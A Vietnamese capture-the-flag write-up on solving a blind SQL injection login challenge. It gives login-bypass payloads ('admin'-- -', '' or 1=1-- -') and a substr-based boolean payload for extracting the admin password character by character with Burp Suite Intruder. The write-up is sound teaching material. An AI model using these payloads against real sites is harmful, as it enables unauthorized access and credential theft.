Bài này thực sự phải đoán mò khá nhiều:

- Đoán bảng người dùng là users
- Đoán cột tên đăng nhập là username
- Đoán cột mật khẩu là password

Bài này là dạng `blind sql`, nên không thể khai thác theo cách thông thường là `union select...` được rồi, thử cũng thấy ngay từ khóa `union` bị filter.

Inject đơn giản:

> login: admin'-- -
>
> password: 123

hiện thông báo `Welcome admin` zz. Vào được thật nhưng không có flag, thử tiếp:

> login: admin
>
> password: ' or 1=1-- -

hiện thông báo `Welcome user1`. Vậy có vẻ có 2 user nhỉ, check thử xem:

> login: user1
>
> password: ' or (select count(*) from users) = 2-- -

thông báo Welcome, ồ vậy đúng là chỉ có 2 users thôi, và ta cũng biết cách mò pass của admin như thế nào rồi.

Nhập liệu với input như sau:

> login: user1
>
> password: ' or (select substr((select password from users where username='admin'),1,1)) = 'a'-- -

Brute-force dùng intruder của Burp Suite, thay lần lượt cả bảng chữ cái và chữ số vào, quan sát xem response nào có length khác những response còn lại thì đó chính là chữ cái đầu của password admin. Kết quả là chữ e

Tiếp tục như vậy ra vị trí số 2 là 2,số 3 là a, v.v...

Đến khi nào thấy các response đều trả về như nhau có nghĩa là password kết thúc(hoặc có thể viết query đoán length của password bằng bao nhiêu, bài này là 8)